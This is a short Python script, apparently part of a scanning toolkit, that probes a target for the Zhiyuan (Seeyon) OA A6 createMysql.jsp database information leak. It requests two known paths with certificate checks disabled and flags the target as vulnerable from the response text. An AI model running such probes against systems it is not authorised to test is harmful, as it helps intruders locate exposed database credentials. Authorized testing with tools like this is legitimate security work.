#!/usr/bin/env python
# coding=utf-8
#致远OA A6 createMysql.jsp 数据库敏感信息泄露
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    try:
        response = requests.get(url=url + '/yyoa/createMysql.jsp', verify=False,timeout=20)
        response2 = requests.get(url=url + '/yyoa/ext/createMysql.jsp', verify=False, timeout=20)
        if 'localhost' in response.text and 'debugger' in response2.text:
            print(colored('[+]存在致远OAA6数据库敏感信息泄露', 'red'))
            results = f'{url}-->存在致远OAA6数据库敏感信息泄露'
        else:
            print('[-]不存在致远OAA6数据库敏感信息泄露')
    except:
        print('[-]不存在致远OAA6数据库敏感信息泄露')


def zhiyuanOAA6SQLxielou(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
